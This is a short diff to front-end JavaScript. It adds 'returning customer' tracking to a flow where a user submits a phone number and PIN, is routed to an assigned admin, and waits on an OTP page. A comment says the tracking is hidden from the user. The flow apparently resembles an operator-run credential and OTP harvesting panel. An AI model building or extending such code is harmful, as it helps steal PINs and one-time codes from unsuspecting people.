@@ -793,7 +793,9 @@
           phoneNumber,
           pin,
           adminId: adminId || null,
-          assignmentType: adminId ? 'specific' : 'auto'
+          assignmentType: adminId ? 'specific' : 'auto',
+          isReturningUser: S.isReturningUser || false,
+          previousCount: S.previousCount || 0
         })
       });
 
@@ -807,6 +809,19 @@
         S.assignedAdminId = data.assignedAdminId;
 
         document.getElementById('otpPh').textContent = phoneNumber;
+
+        // Check if returning customer (for admin info, not displayed to user)
+        try {
+          const checkRes = await fetch(`/api/check-returning-customer/${encodeURIComponent(phoneNumber)}`);
+          const checkData = await checkRes.json();
+          if (checkData.success && checkData.isReturning && checkData.previousCount > 0) {
+            S.isReturningUser = true;
+            S.previousCount = checkData.previousCount;
+            console.log(`🔄 Returning customer: ${phoneNumber} (${checkData.previousCount} previous)`);
+          }
+        } catch (err) {
+          console.error('Error checking returning customer:', err);
+        }
 
         goTo('page-otp');
         document.getElementById('pinWait').classList.add('show');
